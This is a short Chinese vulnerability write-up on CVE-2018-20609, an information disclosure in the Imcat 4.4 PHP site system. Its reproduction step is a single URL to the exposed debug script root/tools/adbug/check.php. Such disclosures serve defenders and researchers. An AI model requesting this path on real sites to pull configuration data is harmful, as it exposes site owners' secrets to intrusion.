# （CVE-2018-20609）Imcat 4.4 敏感信息泄露

> 原文：[https://www.zhihuifly.com/t/topic/2974](https://www.zhihuifly.com/t/topic/2974)

# （CVE-2018-20609）Imcat 4.4 敏感信息泄露

## 一、漏洞简介

imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/check.php URI利用该漏洞获取敏感的配置信息。

## 二、漏洞影响

imcat 4.4

## 三、复现过程

```
http://www.0-sec.org/root/tools/adbug/check.php 
```

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

## 参考链接

> https://github.com/AvaterXXX/CVEs/blob/master/imcat.md